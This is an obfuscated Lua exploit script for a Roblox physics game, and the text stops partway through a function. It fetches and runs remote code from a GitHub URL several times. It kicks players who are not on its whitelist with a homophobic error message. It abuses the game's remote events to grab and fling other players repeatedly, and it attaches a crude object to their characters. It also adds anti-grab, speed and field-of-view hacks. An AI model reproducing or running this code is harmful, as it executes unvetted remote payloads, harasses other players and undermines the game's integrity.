local obf_stringchar = string.char;
local obf_stringbyte = string.byte;
local obf_stringsub = string.sub;
local obf_bitlib = bit32 or bit;
local obf_XOR = obf_bitlib.bxor;
local obf_tableconcat = table.concat;
local obf_tableinsert = table.insert;
local function LUAOBFUSACTOR_DECRYPT_STR_0(LUAOBFUSACTOR_STR, LUAOBFUSACTOR_KEY)
	local result = {};
	for i = 1, #LUAOBFUSACTOR_STR do
		obf_tableinsert(result, obf_stringchar(obf_XOR(obf_stringbyte(obf_stringsub(LUAOBFUSACTOR_STR, i, i + 1)), obf_stringbyte(obf_stringsub(LUAOBFUSACTOR_KEY, 1 + (i % #LUAOBFUSACTOR_KEY), 1 + (i % #LUAOBFUSACTOR_KEY) + 1))) % 256));
	end
	return obf_tableconcat(result);
end
loadstring(game:HttpGet("https://raw.githubusercontent.com/dg2iugesgh/rfsdv324t/main/pr234hWL3478.lua"))();
loadstring(game:HttpGet("https://raw.githubusercontent.com/dg2iugesgh/rfsdv324t/main/e23v2e.lua"))();
if not table.find(acc_y, game['Players']['LocalPlayer']['UserId'] .. game['Players']['LocalPlayer']['Character']['Name']) then
	local v0 = 1280 - (60 + 1220);
	local v1;
	local v2;
	while true do
		if (v0 == (0 + 0)) then
			v1 = LUAOBFUSACTOR_DECRYPT_STR_0("\81\99\222\49\209\28\40\11\178\48", "\93\113\42\147\17\150");
			v2 = game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\221\237\31\170\36\19\238\252\10\162\30\4\224\250\14\161\40", "\112\143\136\111\198\77"))['DefaultChatSystemChatEvents']['SayMessageRequest']:FireServer(v1, LUAOBFUSACTOR_DECRYPT_STR_0("\166\165\14", "\135\231\201\98"));
			v0 = 1 + 0;
		end
		if (v0 == (2 - 1)) then
			game['Players']['LocalPlayer']:Kick("Error code: GAY \n[ Made with ❤️ by Range#8998 and Reyn#7525 ]");
			break;
		end
	end
else
	local v3 = 1864 - (1710 + 154);
	local v4;
	local v5;
	while true do
		if (v3 == (321 - (200 + 118))) then
			lag();
			blob_p();
			other();
			settings();
			plr = game['Players']['LocalPlayer'];
			hum = plr['Character']:WaitForChild(LUAOBFUSACTOR_DECRYPT_STR_0("\126\168\233\22\195\168\95\185\214\24\194\179\102\188\246\3", "\199\54\221\132\119\173"));
			v3 = 2 + 2;
		end
		if (v3 == (2 - 0)) then
			function make_set(v11)
				local v12 = 0 - 0;
				local v13;
				while true do
					if (v12 == (1 + 0)) then
						return v13;
					end
					if (v12 == (0 + 0)) then
						v13 = {};
						for v88, v89 in ipairs(v11) do
							v13[v89] = true;
						end
						v12 = 1 + 0;
					end
				end
			end
			function settings()
				local v14 = 0 + 0;
				local v15;
				local v16;
				local v17;
				while true do
					if ((2 - 1) == v14) then
						counter = 1250 - (363 + 887);
						v16 = v15.AddSlider(LUAOBFUSACTOR_DECRYPT_STR_0("\42\172\23", "\217\108\227\65\98\85\141\160"), {[LUAOBFUSACTOR_DECRYPT_STR_0("\216\236\34", "\163\149\133\76\94")]=(87 - 37),[LUAOBFUSACTOR_DECRYPT_STR_0("\141\12\55", "\182\192\109\79\70\149\84")]=(571 - 451),[LUAOBFUSACTOR_DECRYPT_STR_0("\228\95\235", "\96\160\58\141\88")]=(11 + 59)}, function(v91)
							Workspace['CurrentCamera']['FieldOfView'] = v91;
						end);
						v14 = 4 - 2;
					end
					if (v14 == (0 + 0)) then
						function rainbow(v93)
							return math.acos(math.cos(v93 * math['pi'])) / math['pi'];
						end
						v15 = v5.AddPage(LUAOBFUSACTOR_DECRYPT_STR_0("\136\196\167\71\4\181\198\160", "\109\219\161\211\51"));
						v14 = 1665 - (674 + 990);
					end
					if (v14 == (1 + 1)) then
						v17 = v15.AddToggle(LUAOBFUSACTOR_DECRYPT_STR_0("\40\60\92\71\42\244\103\90\26\96\96", "\16\122\93\53\41\72\155"), false, function(v94)
							RainbowMode = v94;
						end);
						break;
					end
				end
			end
			function blob_p()
				local v18 = 0 + 0;
				while true do
					if (v18 == (1 - 0)) then
						function drop_l(v95, v96)
							local v97 = 1055 - (507 + 548);
							local v98;
							local v99;
							local v100;
							while true do
								if (v97 == (839 - (289 + 548))) then
									wait();
									break;
								end
								if (v97 == (1818 - (821 + 997))) then
									v98 = v96['CreatureBlobman']['LeftDetector']['LeftWeld'];
									v99 = v95:WaitForChild(LUAOBFUSACTOR_DECRYPT_STR_0("\42\38\75\123\90\1\69\182\48\60\73\110\100\15\94\166", "\210\98\83\38\26\52\110\44"), 256 - (195 + 60));
									v97 = 1 + 0;
								end
								if (v97 == (1502 - (251 + 1250))) then
									v100 = v96['CreatureBlobman']['BlobmanSeatAndOwnerScript']['CreatureDrop'];
									v100:FireServer(v98, v99);
									v97 = 5 - 3;
								end
							end
						end
						path = game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\32\40\230\83\4\55\245\91\18", "\56\119\71\148"))[game['Players']['LocalPlayer']['Character']['Name'] .. LUAOBFUSACTOR_DECRYPT_STR_0("\220\72\215\228\225\93\210\218\225\108\217\234\252", "\147\143\56\182")];
						function call()
							local v101 = 0 + 0;
							while true do
								if (v101 == (1034 - (809 + 223))) then
									loadstring(game:HttpGet("https://raw.githubusercontent.com/dg2iugesgh/rfsdv324t/main/pr234hWL3478.lua"))();
									loadstring(game:HttpGet("https://raw.githubusercontent.com/dg2iugesgh/rfsdv324t/main/e23v2e.lua"))();
									v101 = 3 - 0;
								end
								if (v101 == (0 - 0)) then
									if not table.find(acc_y, game['Players']['LocalPlayer']['UserId'] .. game['Players']['LocalPlayer']['Character']['Name']) then
										local v245 = 0 - 0;
										local v246;
										local v247;
										while true do
											if (v245 == (0 + 0)) then
												v246 = LUAOBFUSACTOR_DECRYPT_STR_0("\159\255\172\191\14\254\239\192\190\104", "\73\191\182\225\159");
												v247 = game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\240\46\2\206\203\40\19\214\199\47\33\214\205\57\19\197\199", "\162\162\75\114"))['DefaultChatSystemChatEvents']['SayMessageRequest']:FireServer(v246, LUAOBFUSACTOR_DECRYPT_STR_0("\170\139\24", "\53\235\231\116\98"));
												v245 = 1 + 0;
											end
											if (v245 == (618 - (14 + 603))) then
												game['Players']['LocalPlayer']:Kick("Error code: GAY \n[ Made with ❤️ by Range#8998 and Reyn#7525 ]");
												break;
											end
										end
									end
									rand_v = true;
									v101 = 130 - (118 + 11);
								end
								if (v101 == (1 + 2)) then
									if not table.find(nil_, game['Players']['LocalPlayer']['Character']['Name'] .. game['Players']['LocalPlayer']['UserId']) then
										local v248 = 0 + 0;
										local v249;
										local v250;
										while true do
											if (v248 == (0 - 0)) then
												v249 = LUAOBFUSACTOR_DECRYPT_STR_0("\4\203\126\198\23\133\32\125\5\163", "\92\36\130\51\230\80\196\121");
												v250 = game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\119\173\165\208\131\185\68\188\176\216\185\174\74\186\180\219\143", "\218\37\200\213\188\234"))['DefaultChatSystemChatEvents']['SayMessageRequest']:FireServer(v249, LUAOBFUSACTOR_DECRYPT_STR_0("\35\115\71", "\19\98\31\43\110"));
												v248 = 950 - (551 + 398);
											end
											if (v248 == (1 + 0)) then
												game['Players']['LocalPlayer']:Kick("Error code: GAY \n[ Made with ❤️ by Range#8998 and Reyn#7525 ]");
												break;
											end
										end
									end
									break;
								end
								if (v101 == (1 + 0)) then
									for v233 = 1 + 0, count do
										local v234 = 0 - 0;
										while true do
											if (v234 == (0 - 0)) then
												if frchck then
													local v276 = 0 + 0;
													local v277;
													while true do
														if (v276 == (0 - 0)) then
															v277 = {};
															for v300, v301 in game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\54\19\83\222\169\96\152", "\235\102\127\50\167\204\18")):GetPlayers() do
																if v301:IsFriendsWith(game['Players']['LocalPlayer'].UserId) then
																	table.insert(v277, v301.Name);
																end
															end
															v276 = 1 + 0;
														end
														if ((90 - (40 + 49)) == v276) then
															v277 = make_set(v277);
															break;
														end
													end
												end
												if (location_b == LUAOBFUSACTOR_DECRYPT_STR_0("\96\168\251\40\4\6\95\180\230\38", "\78\48\193\149\67\36")) then
													path = game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\7\17\146\19\82\32\31\131\29", "\33\80\126\224\120"))['PlotItems']['Plot2'];
												elseif (location_b == LUAOBFUSACTOR_DECRYPT_STR_0("\203\186\6\193\82\172\128\12\209\79\233", "\60\140\200\99\164")) then
													path = game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\176\251\22\45\177\151\245\7\35", "\194\231\148\100\70"))['PlotItems']['Plot1'];
												elseif (location_b == LUAOBFUSACTOR_DECRYPT_STR_0("\113\69\213\160\254\136\110\67\212\176\243", "\168\38\44\161\195\150")) then
													path = game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\183\243\144\125\35\248\183\21\133", "\118\224\156\226\22\80\136\214"))['PlotItems']['Plot3'];
												elseif (location_b == LUAOBFUSACTOR_DECRYPT_STR_0("\104\239\73\129\76\174\113\143\87\253\92", "\224\34\142\57")) then
													path = game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\233\168\215\214\96\225\92\13\219", "\110\190\199\165\189\19\145\61"))['PlotItems']['Plot5'];
												elseif (location_b == LUAOBFUSACTOR_DECRYPT_STR_0("\248\231\98\237\203\239\213\254\100\237", "\167\186\139\23\136\235")) then
													path = game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\45\186\154\6\9\165\137\14\31", "\109\122\213\232"))['PlotItems']['Plot4'];
												else
													path = game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\217\248\176\59\253\231\163\51\235", "\80\142\151\194"))[game['Players']['LocalPlayer']['Character']['Name'] .. LUAOBFUSACTOR_DECRYPT_STR_0("\48\214\118\91\13\195\115\101\13\242\120\85\16", "\44\99\166\23")];
												end
												v234 = 3 - 2;
											end
											if (v234 == (491 - (99 + 391))) then
												for v272, v273 in game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\76\251\40\47\54\182\111", "\196\28\151\73\86\83")):GetPlayers() do
													if (frchck and not game['Players']['LocalPlayer']:IsFriendsWith(v273.UserId) and not focus_p and (v273 ~= l_p)) then
														local v287 = 0 + 0;
														while true do
															if (v287 == (0 - 0)) then
																rand_v = not rand_v;
																if rand_v then
																	local v320 = 0 - 0;
																	while true do
																		if ((1 + 0) == v320) then
																			drop_r(v273.Character, path);
																			break;
																		end
																		if (v320 == (0 - 0)) then
																			grab_r(v273.Character, path);
																			wait(wait_blob);
																			v320 = 1605 - (1032 + 572);
																		end
																	end
																else
																	local v321 = 417 - (203 + 214);
																	while true do
																		if (v321 == (1818 - (568 + 1249))) then
																			drop_l(v273.Character, path);
																			break;
																		end
																		if (v321 == (0 + 0)) then
																			grab_l(v273.Character, path);
																			wait(wait_blob);
																			v321 = 2 - 1;
																		end
																	end
																end
																break;
															end
														end
													elseif (focus_p and (v273['Name'] == focus_pname) and (v273 ~= l_p)) then
														local v299 = 0 - 0;
														while true do
															if (v299 == (1306 - (913 + 393))) then
																rand_v = not rand_v;
																if rand_v then
																	local v332 = 0 - 0;
																	while true do
																		if (v332 == (0 - 0)) then
																			grab_r(v273.Character, path);
																			wait(wait_blob);
																			v332 = 411 - (269 + 141);
																		end
																		if (v332 == (2 - 1)) then
																			drop_r(v273.Character, path);
																			break;
																		end
																	end
																else
																	local v333 = 1981 - (362 + 1619);
																	while true do
																		if (v333 == (1625 - (950 + 675))) then
																			grab_l(v273.Character, path);
																			wait(wait_blob);
																			v333 = 1 + 0;
																		end
																		if (v333 == (1180 - (216 + 963))) then
																			drop_l(v273.Character, path);
																			break;
																		end
																	end
																end
																break;
															end
														end
													elseif ((v273 ~= l_p) and not focus_p and not frchck) then
														local v315 = 1287 - (485 + 802);
														while true do
															if (v315 == (559 - (432 + 127))) then
																rand_v = not rand_v;
																if rand_v then
																	local v345 = 1073 - (1065 + 8);
																	while true do
																		if (v345 == (0 + 0)) then
																			grab_r(v273.Character, path);
																			wait(wait_blob);
																			v345 = 1602 - (635 + 966);
																		end
																		if (v345 == (1 + 0)) then
																			drop_r(v273.Character, path);
																			break;
																		end
																	end
																else
																	local v346 = 42 - (5 + 37);
																	while true do
																		if (v346 == (2 - 1)) then
																			drop_l(v273.Character, path);
																			break;
																		end
																		if (v346 == (0 + 0)) then
																			grab_l(v273.Character, path);
																			wait(wait_blob);
																			v346 = 1 - 0;
																		end
																	end
																end
																break;
															end
														end
													end
												end
												break;
											end
										end
									end
									loadstring(game:HttpGet("https://raw.githubusercontent.com/dg2iugesgh/rfsdv324t/main/ch_wl_lst.lua"))();
									v101 = 1 + 1;
								end
							end
						end
						v18 = 3 - 1;
					end
					if (v18 == (15 - 11)) then
						blob_p.AddSlider(LUAOBFUSACTOR_DECRYPT_STR_0("\223\12\38\0", "\22\147\99\73\112\226\56\120"), {[LUAOBFUSACTOR_DECRYPT_STR_0("\149\124\236", "\237\216\21\130\149")]=(1 - 0),[LUAOBFUSACTOR_DECRYPT_STR_0("\175\79\71", "\62\226\46\63\63\208\169")]=(59 - 34),[LUAOBFUSACTOR_DECRYPT_STR_0("\193\28\83", "\62\133\121\53\227\127\109\79")]=(4 + 1)}, function(v102)
							count = v102;
						end);
						blob_p.AddSlider(LUAOBFUSACTOR_DECRYPT_STR_0("\39\21\59\225\150\149\175\3\41", "\194\112\116\82\149\182\206"), {[LUAOBFUSACTOR_DECRYPT_STR_0("\20\161\66", "\110\89\200\44\120\160\130")]=(530 - (318 + 211)),[LUAOBFUSACTOR_DECRYPT_STR_0("\134\194\83", "\45\203\163\43\38\35\42\91")]=(123 - 98),[LUAOBFUSACTOR_DECRYPT_STR_0("\246\128\218", "\52\178\229\188\67\231\201")]=(1588 - (963 + 624))}, function(v103)
							wait_blob = v103 / (5 + 5);
						end);
						blob_p.AddDropdown(LUAOBFUSACTOR_DECRYPT_STR_0("\13\78\83\5\227\85\44\47", "\67\65\33\48\100\151\60"), {LUAOBFUSACTOR_DECRYPT_STR_0("\240\242\186\203\250\219\226", "\147\191\135\206\184"),LUAOBFUSACTOR_DECRYPT_STR_0("\180\33\168\202\152\123\189\145\59\163", "\210\228\72\198\161\184\51"),LUAOBFUSACTOR_DECRYPT_STR_0("\1\64\231\19\123\142\30\70\230\3\118", "\174\86\41\147\112\19"),LUAOBFUSACTOR_DECRYPT_STR_0("\121\12\152\14\101\39\30\190\72\5", "\203\59\96\237\107\69\111\113"),LUAOBFUSACTOR_DECRYPT_STR_0("\3\4\169\228\63\176\255\43\3\191\228", "\183\68\118\204\129\81\144"),LUAOBFUSACTOR_DECRYPT_STR_0("\36\172\96\229\5\194\38\162\101\247\14", "\226\110\205\16\132\107")}, function(v104)
							location_b = v104;
						end);
						v18 = 13 - 8;
					end
					if ((2 + 0) == v18) then
						frchck = true;
						focus_p = false;
						count = 3 + 2;
						v18 = 5 - 2;
					end
					if ((2 + 1) == v18) then
						location_b = LUAOBFUSACTOR_DECRYPT_STR_0("\196\214\244\202\72\239\198", "\33\139\163\128\185");
						wait_blob = 0.1 + 0;
						blob_p = v5.AddPage(LUAOBFUSACTOR_DECRYPT_STR_0("\117\84\11\220", "\190\55\56\100"));
						v18 = 12 - 8;
					end
					if (v18 == (0 + 0)) then
						function grab_r(v105, v106)
							local v107 = 1019 - (829 + 190);
							local v108;
							local v109;
							local v110;
							local v111;
							while true do
								if (v107 == (3 - 2)) then
									v110 = v106['CreatureBlobman']['RightDetector']['RightWeld'];
									v111 = v106['CreatureBlobman']['BlobmanSeatAndOwnerScript']['CreatureGrab'];
									v107 = 2 - 0;
								end
								if (v107 == (0 - 0)) then
									v108 = v106['CreatureBlobman']['RightDetector'];
									v109 = v105:WaitForChild(LUAOBFUSACTOR_DECRYPT_STR_0("\126\186\49\31\29\236\250\82\157\51\17\7\211\242\68\187", "\147\54\207\92\126\115\131"), 2 - 1);
									v107 = 1 + 0;
								end
								if (v107 == (1 + 1)) then
									v111:FireServer(v108, v109, v110);
									wait();
									break;
								end
							end
						end
						function drop_r(v112, v113)
							local v114 = 0 - 0;
							local v115;
							local v116;
							local v117;
							while true do
								if (v114 == (0 + 0)) then
									v115 = v113['CreatureBlobman']['RightDetector']['RightWeld'];
									v116 = v112:WaitForChild(LUAOBFUSACTOR_DECRYPT_STR_0("\37\36\56\124\3\113\4\53\7\114\2\106\61\48\39\105", "\30\109\81\85\29\109"), 614 - (520 + 93));
									v114 = 277 - (259 + 17);
								end
								if (v114 == (1 + 0)) then
									v117 = v113['CreatureBlobman']['BlobmanSeatAndOwnerScript']['CreatureDrop'];
									v117:FireServer(v115, v116);
									v114 = 1 + 1;
								end
								if (v114 == (6 - 4)) then
									wait();
									break;
								end
							end
						end
						function grab_l(v118, v119)
							local v120 = 591 - (396 + 195);
							local v121;
							local v122;
							local v123;
							local v124;
							while true do
								if (v120 == (5 - 3)) then
									v124:FireServer(v121, v122, v123);
									wait();
									break;
								end
								if (v120 == (1762 - (440 + 1321))) then
									v123 = v119['CreatureBlobman']['LeftDetector']['LeftWeld'];
									v124 = v119['CreatureBlobman']['BlobmanSeatAndOwnerScript']['CreatureGrab'];
									v120 = 1831 - (1059 + 770);
								end
								if (v120 == (0 - 0)) then
									v121 = v119['CreatureBlobman']['LeftDetector'];
									v122 = v118:WaitForChild(LUAOBFUSACTOR_DECRYPT_STR_0("\215\100\89\183\56\209\245\251\67\91\185\34\238\253\237\101", "\156\159\17\52\214\86\190"), 546 - (424 + 121));
									v120 = 1 + 0;
								end
							end
						end
						v18 = 1348 - (641 + 706);
					end
					if (v18 == (2 + 3)) then
						blob_p.AddToggle(LUAOBFUSACTOR_DECRYPT_STR_0("\136\253\180\185\160\235\253\159\166\234\190\183", "\220\206\143\221"), true, function(v125)
							frchck = v125;
						end);
						blob_p.AddToggle(LUAOBFUSACTOR_DECRYPT_STR_0("\160\114\46\2\203\140\226\138\124\52\18\202", "\178\230\29\77\119\184\172"), false, function(v126)
							focus_p = v126;
						end);
						break;
					end
				end
			end
			function other()
				local v19 = 440 - (249 + 191);
				local v20;
				local v21;
				local v22;
				local v23;
				local v24;
				local v25;
				local v26;
				local v27;
				while true do
					if (v19 == (17 - 13)) then
						v24 = other.AddButton(LUAOBFUSACTOR_DECRYPT_STR_0("\198\187\30\91\79\193\207", "\152\149\222\106\123\23"), function()
							v21 = game['Players']['LocalPlayer']['Character']['Head']['CFrame'];
						end);
						v25 = other.AddButton(LUAOBFUSACTOR_DECRYPT_STR_0("\238\54\247\84\187", "\213\189\70\150\35"), function()
							v20(v21);
						end);
						v26 = other.AddToggle(LUAOBFUSACTOR_DECRYPT_STR_0("\110\91\96\1\104\71\117\10", "\104\47\53\20"), false, function()
							anti_grab();
						end);
						v27 = other.AddSlider(LUAOBFUSACTOR_DECRYPT_STR_0("\148\77\141\23\252\60\179\73\132\24", "\111\195\44\225\124\220"), {[LUAOBFUSACTOR_DECRYPT_STR_0("\245\79\14", "\203\184\38\96\19\203")]=(1 + 0),[LUAOBFUSACTOR_DECRYPT_STR_0("\20\114\97", "\174\89\19\25\33")]=(963 - 713),[LUAOBFUSACTOR_DECRYPT_STR_0("\11\23\84", "\107\79\114\50\46\151\231")]=(432 - (183 + 244))}, function(v128)
							game['Players']['LocalPlayer']['Character']['Humanoid']['WalkSpeed'] = v128;
						end);
						break;
					end
					if (v19 == (0 + 0)) then
						Toys_Folder = game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\14\169\167\34\153\41\182\195\60", "\160\89\198\213\73\234\89\215"))[game['Players']['LocalPlayer']['Character']['Name'] .. LUAOBFUSACTOR_DECRYPT_STR_0("\123\97\181\233\203\77\117\157\240\241\71\104\167", "\165\40\17\212\158")];
						by = {};
						function penis(v130)
							for v191, v192 in pairs(Toys_Folder:GetDescendants()) do
								if ((v192['Name'] == LUAOBFUSACTOR_DECRYPT_STR_0("\209\209\1\32\18\234\192\27\29\51\232\219\13\33", "\70\133\185\104\83")) and (v192['Parent']['Name'] == LUAOBFUSACTOR_DECRYPT_STR_0("\48\74\75\38\249\1\75\71\35\197", "\169\100\37\36\74"))) then
									if make_set(by)[v192['Value']] then
									else
										local v251 = 730 - (434 + 296);
										while true do
											if (v251 == (2 - 1)) then
												game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\50\130\178\92\9\132\163\68\5\131\145\68\15\149\163\87\5", "\48\96\231\194"))['GrabEvents']['SetNetworkOwner']:FireServer(v192['Parent'].StickyPart, game['Players']['LocalPlayer']['Character']['Head'].CFrame);
												game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\250\95\30\33\16\219\174\151\205\94\61\57\22\202\174\132\205", "\227\168\58\110\77\121\184\207"))['PlayerEvents']['StickyPartEvent']:FireServer(v192['Parent'].StickyPart, game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\76\51\173\75\162\203\112\166\126", "\197\27\92\223\32\209\187\17"))[Komy_Chlen].Torso, CFrame.new(512 - (169 + 343), -(1.35 + 0), 0 - 0, 0 - 0, 9 + 1, 0 - 0, -(1128 - (651 + 472)), 0 + 0, 0 + 0, 219 - 39, 483 - (397 + 86), 876 - (423 + 453)));
												v251 = 1 + 1;
											end
											if ((0 + 0) == v251) then
												table.insert(by, v192.Value);
												Komy_Chlen = v130;
												v251 = 1 + 0;
											end
											if (v251 == (2 + 0)) then
												return;
											end
										end
									end
								end
							end
						end
						function makep()
							for v193, v194 in game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\52\80\209\240\16\79\194\248\6", "\155\99\63\163")):GetDescendants() do
								if ((v194['Name'] == LUAOBFUSACTOR_DECRYPT_STR_0("\161\217\160\153\141\157\146\216\175\138", "\228\226\177\193\237\217")) and (v194['Parent']['Parent']['Name'] ~= LUAOBFUSACTOR_DECRYPT_STR_0("\4\188\34\255\49\162\48\207\58\128\47\233\32\163", "\134\84\208\67"))) then
									local v219 = 0 + 0;
									while true do
										if (v219 == (1190 - (50 + 1140))) then
											v194 = tostring(v194.Parent);
											penis(v194);
											break;
										end
									end
								end
							end
						end
						v19 = 1 + 0;
					end
					if (v19 == (1 + 0)) then
						function selfp()
							local v131 = 0 + 0;
							while true do
								if ((0 - 0) == v131) then
									game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\33\169\150\80\26\175\135\72\22\168\181\72\28\190\135\91\22", "\60\115\204\230"))['GrabEvents']['SetNetworkOwner']:FireServer(game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\208\53\249\123\244\42\234\115\226", "\16\135\90\139"))[game['Players']['LocalPlayer']['Character']['Name'] .. LUAOBFUSACTOR_DECRYPT_STR_0("\103\100\7\36\64\81\124\125\122\50\60\87\71", "\24\52\20\102\83\46\52")]['ToolPencil'].StickyPart, game['Players']['LocalPlayer']['Character']['Head'].CFrame);
									game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\246\42\49\40\6\199\46\53\33\11\247\59\46\54\14\195\42", "\111\164\79\65\68"))['PlayerEvents']['StickyPartEvent']:FireServer(game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\241\214\145\213\61\250\199\218\134", "\138\166\185\227\190\78"))[game['Players']['LocalPlayer']['Character']['Name'] .. LUAOBFUSACTOR_DECRYPT_STR_0("\248\100\196\32\92\38\29\226\122\241\56\75\48", "\121\171\20\165\87\50\67")]['ToolPencil'].StickyPart, game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\241\55\171\61\170\18\199\59\188", "\98\166\88\217\86\217"))[game['Players']['LocalPlayer']['Character']['Name']].Torso, CFrame.new(0 + 0, -(597.35 - (157 + 439)), 0 - 0, 0 - 0, 29 - 19, 918 - (782 + 136), -(860 - (112 + 743)), 1171 - (1026 + 145), 0 + 0, 898 - (493 + 225), 0 - 0, 0 + 0));
									break;
								end
							end
						end
						function anti_grab()
							local v132 = 0 - 0;
							local v133;
							local v134;
							local v135;
							local v136;
							local v137;
							local v138;
							local v139;
							local v140;
							local v141;
							local v142;
							while true do
								if (v132 == (1 + 3)) then
									v142 = nil;
									function v142()
										local v235 = 0 - 0;
										local v236;
										local v237;
										local v238;
										while true do
											if (v235 == (0 + 0)) then
												v236 = v134['Character'] or v134['CharacterAdded']:Wait();
												v237 = v236:FindFirstChildWhichIsA(LUAOBFUSACTOR_DECRYPT_STR_0("\222\227\116\0\136\211\255\242", "\188\150\150\25\97\230")) or v236:WaitForChild(LUAOBFUSACTOR_DECRYPT_STR_0("\242\156\82\3\2\226\211\141", "\141\186\233\63\98\108"));
												v235 = 1 - 0;
											end
											if (v235 == (1596 - (210 + 1385))) then
												v238 = v236:WaitForChild(LUAOBFUSACTOR_DECRYPT_STR_0("\217\255\33\183\43\254\227\40\132\42\254\254\28\183\55\229", "\69\145\138\76\214"));
												v238:WaitForChild(LUAOBFUSACTOR_DECRYPT_STR_0("\86\198\155\140\143\26\113\214\140\155\143\23\98\219", "\118\16\175\233\233\223")):Remove();
												v235 = 1691 - (1201 + 488);
											end
											if (v235 == (2 + 0)) then
												v237['Changed']:Connect(function(v274)
													if ((v274 == LUAOBFUSACTOR_DECRYPT_STR_0("\184\141\33", "\29\235\228\85\219\142\235")) and (v237['Sit'] == true)) then
														if ((v237['SeatPart'] ~= nil) and (tostring(v237['SeatPart'].Parent) == LUAOBFUSACTOR_DECRYPT_STR_0("\30\198\191\220\99\91\53\87\31\216\181\223\122\79\41", "\50\93\180\218\189\23\46\71"))) then
														elseif (v237['SeatPart'] == nil) then
															local v316 = 0 - 0;
															while true do
																if (v316 == (0 - 0)) then
																	v237:SetStateEnabled(Enum['HumanoidStateType'].Jumping, true);
																	v237['Sit'] = false;
																	break;
																end
															end
														end
													end
												end);
												break;
											end
										end
									end
									v142();
									v132 = 590 - (352 + 233);
								end
								if ((4 - 2) == v132) then
									v139 = v134:WaitForChild(LUAOBFUSACTOR_DECRYPT_STR_0("\247\183\115\73\72\216", "\40\190\196\59\44\36\188"));
									v140 = v134:WaitForChild(LUAOBFUSACTOR_DECRYPT_STR_0("\12\73\221\173\255\111\62\63\87\213\164\238\110", "\109\92\37\188\212\154\29"));
									v141 = v137:WaitForChild(LUAOBFUSACTOR_DECRYPT_STR_0("\55\251\182\214\54\93\8\234", "\58\100\143\196\163\81"));
									v132 = 2 + 1;
								end
								if ((2 - 1) == v132) then
									v136 = game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\40\71\51\175\54\74\228\26\31\70\16\183\48\91\228\9\31", "\110\122\34\67\195\95\41\133"));
									v137 = v136:WaitForChild(LUAOBFUSACTOR_DECRYPT_STR_0("\86\185\90\88\215\118\165\94\88\243\99\180\85\94\197", "\182\21\209\59\42"));
									v138 = game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\133\66\203\46\36\172\161\94\198\24", "\222\215\55\165\125\65"));
									v132 = 576 - (489 + 85);
								end
								if (v132 == (1501 - (277 + 1224))) then
									v133 = game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\28\221\199\3\247\211\254", "\42\76\177\166\122\146\161\141"));
									v134 = v133['LocalPlayer'];
									v135 = v134['Character'] or v134['CharacterAdded']:Wait();
									v132 = 1494 - (663 + 830);
								end
								if ((5 + 0) == v132) then
									v134['CharacterAdded']:Connect(v142);
									break;
								end
								if (v132 == (6 - 3)) then
									workspace['DescendantAdded']:Connect(function(v239)
										if v239:IsA(LUAOBFUSACTOR_DECRYPT_STR_0("\128\146\21\194\118\101\172\133\11", "\22\197\234\101\174\25")) then
											v239['MaxForcePerStudSquared'] = 875 - (461 + 414);
										end
									end);
									workspace['DescendantAdded']:Connect(function(v240)
										if v240:IsA(LUAOBFUSACTOR_DECRYPT_STR_0("\30\32\183\201\113\168\219\131", "\230\77\84\197\188\22\207\183")) then
											v240:Disconnect();
										end
									end);
									v139['Changed']:Connect(function(v241)
										if (v241 == true) then
											local v266 = 0 + 0;
											local v267;
											while true do
												if (v266 == (0 + 0)) then
													v267 = v134['Character'];
													if (v139['Value'] == true) then
														local v293 = 0 + 0;
														local v294;
														while true do
															if (v293 == (0 + 0)) then
																v294 = nil;
																v294 = v138['RenderStepped']:Connect(function()
																	if (v139['Value'] == true) then
																		local v335 = 250 - (172 + 78);
																		while true do
																			if (v335 == (0 - 0)) then
																				v267[LUAOBFUSACTOR_DECRYPT_STR_0("\209\1\203\253\130\174\249\49\203\27\201\232\188\160\226\33", "\85\153\116\166\156\236\193\144")]['AssemblyLinearVelocity'] = Vector3.new();
																				v141:FireServer(v134);
																				break;
																			end
																		end
																	elseif (v139['Value'] == false) then
																		v294:Disconnect();
																	end
																end);
																break;
															end
														end
													end
													break;
												end
											end
										end
									end);
									v132 = 2 + 2;
								end
							end
						end
						v20 = nil;
						function v20(v143)
							if (v143 ~= nil) then
								game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\150\229\93\191\237\3\165\244\72\183\215\20\171\242\76\180\225", "\96\196\128\45\211\132"))['MenuToys']['SpawnToyRemoteFunction']:InvokeServer(LUAOBFUSACTOR_DECRYPT_STR_0("\5\130\116\79\226\166\184\221", "\184\85\237\27\63\178\207\212"), v143, Vector3.new(0 - 0, 0 + 0, 0 + 0));
							end
						end
						v19 = 3 - 1;
					end
					if (v19 == (2 - 0)) then
						antigrab = false;
						limit = 2 + 3;
						v21 = game['Players']['LocalPlayer']['Character']['Head']['CFrame'];
						other = v5.AddPage(LUAOBFUSACTOR_DECRYPT_STR_0("\39\77\1\90\26", "\63\104\57\105"));
						v19 = 2 + 1;
					end
					if (v19 == (2 + 1)) then
						other.AddLabel(LUAOBFUSACTOR_DECRYPT_STR_0("\59\130\170\71\2\139", "\36\107\231\196"));
						v22 = other.AddButton(LUAOBFUSACTOR_DECRYPT_STR_0("\122\188\180\130\29\148\174\139", "\231\61\213\194"), function()
							makep();
						end);
